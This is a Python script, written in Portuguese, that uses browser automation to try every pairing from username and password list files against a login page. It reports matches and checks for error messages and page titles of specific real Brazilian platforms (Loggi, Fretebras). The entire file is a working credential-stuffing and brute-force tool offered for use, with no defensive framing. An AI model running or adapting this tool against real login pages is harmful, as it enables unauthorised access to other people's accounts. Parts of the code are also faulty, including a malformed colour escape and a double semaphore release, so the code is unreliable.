from itertools import product
from playwright.sync_api import sync_playwright
import time
import datetime
import concurrent.futures
import threading
import logging

RED = "\033[91m"
BLUE = "\033[94m"
CYAN = "\033[96m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BOLD = "\033[1m"
RESET = "\033[0m"
UNDERLINE = "\033[4m"
MAGENTA = "\033[095m"
WHITE = "\033[97"

hoje = datetime.datetime.now()
log = hoje.strftime("%Y-%m-%d %H:%M:%S")

pausa_tr = threading.Semaphore(1)  # Controla as threads - Limite de 1 thread ao mesmo tempo

credenciais_duplicadas = set()  # Conjunto para armazenar credenciais duplicadas

def validar_cred(credenciais):
    username, password = credenciais

    if (username, password) in credenciais_duplicadas:
        print(MAGENTA + f"{log} => {username} => {password} => Duplicado => O login está duplicado." + RESET)
        return

    credenciais_duplicadas.add((username, password))

    #print(BOLD + f"Iniciando teste para: {username} => {password}" + RESET)

    with sync_playwright() as p:
        browser = p.chromium.launch()
        page = browser.new_page()

        page.goto(url)
        page.fill('input[name=\'{}\']'.format(login), username)
        page.click('text=\'{}\''.format(botao))

        page.fill('input[name=\'{}\']'.format(senha), password)
        page.click('text=\'{}\''.format(botao))

        time.sleep(sleep)
        try:
            if "Pagamento atrasado. (erro-377)" in page.content():
                print(YELLOW + f"{log} => {username} => {password} => Desativado => Pagamento atrasado! (erro-377)" + RESET)
            elif "infelizmente o seu cadastro não foi liberado por nossos analistas. Para mais detalhes entre em contato com nosso atendimento. (erro-368)" in page.content():
                print(YELLOW + f"{log} => {username} => {password} => Desativada => infelizmente o seu cadastro não foi liberado por nossos analistas. Para mais detalhes entre em contato com nosso atendimento. (erro-368)" + RESET)
            elif "O login ou a senha inserida está incorreta. (erro-345)" in page.content():
                print(CYAN + f"{log} => {username} => {password} => No Match => O login ou a senha inserida estão incorretos. (erro-345)" + RESET)
            elif page.title() == 'Loggi' and page.wait_for_selector('//*[@id="root"]', timeout=10000):
                print(GREEN + f"{log} => {username} => {password} => Match => Login bem-sucedido!" + RESET)
            elif page.title() == 'Fretebras - Painel Administrativo':
                print(RED + f"{log} => {username} => {password} => No Match => O login ou a senha inserida estão incorretos." + RESET)
            else:
                print(RED + f"{log} => No Match => Credenciais inválidas ou erro no login" + RESET)             
            pass
        except Exception as error:
            print(f"{log} => {username} => {password} => No Match => Algo deu errado!", error)
        finally:
            browser.close()
            pausa_tr.release()

        pausa_tr.release()  # Libera para próxima thread
        #print(BOLD + f"Teste concluído para: {username} => {password}" + RESET)

def user_pass(arquivo):
    usernames = []
    passwords = []

    # Leitura dos arquivos de usernames e passwords
    with open(arquivo + 'usernames.txt', 'r') as file:
        usernames = file.read().splitlines()

    with open(arquivo + 'passwords.txt', 'r') as file:
        passwords = file.read().splitlines()

    # Combina usernames e passwords em pares
    todas_combinacoes = list(product(usernames, passwords))

    return todas_combinacoes

if __name__ == '__main__':
    filename = './credenciais/'

    url = input("Qual é o caminho completo de login: ")
    sleep = int(input("Qual é o time sleep: "))
    login = input("Qual é o campo de login na page: ")
    senha = input("Qual é o campo de password na page: ")
    botao = input("Qual é o nome do botao send/submit/enviar: ")

    user_pass_combinacoes = user_pass(filename)

    with concurrent.futures.ThreadPoolExecutor() as executar:
        for user_pass_par1 in user_pass_combinacoes:
            pausa_tr.acquire()  # Chama a pausa_tr antes de iniciar as validações
            executar.submit(validar_cred, user_pass_par1)

    print(BOLD + f"Total de testes realizados: {len(user_pass_combinacoes)}" + RESET)
